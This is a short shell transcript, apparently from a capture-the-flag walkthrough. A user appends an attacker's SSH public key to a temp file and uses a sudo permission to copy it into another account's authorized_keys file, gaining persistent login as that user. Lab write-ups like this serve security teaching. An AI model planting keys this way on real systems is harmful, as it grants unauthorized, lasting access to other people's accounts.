
```bash
jenny@shenron:~$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKl7/4iYbETU7TJgVZIjS8tWTWl0DTsdlnrDbbRTbSRn cab00s3@proxmox-kali-ctf" >> /tmp/authorized_keys 
jenny@shenron:~$ cat /tmp/authorized_keys 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKl7/4iYbETU7TJgVZIjS8tWTWl0DTsdlnrDbbRTbSRn cab00s3@proxmox-kali-ctf
jenny@shenron:~$ sudo -u shenron cp /tmp/authorized_keys /home/shenron/.ssh/authorized_keys 
```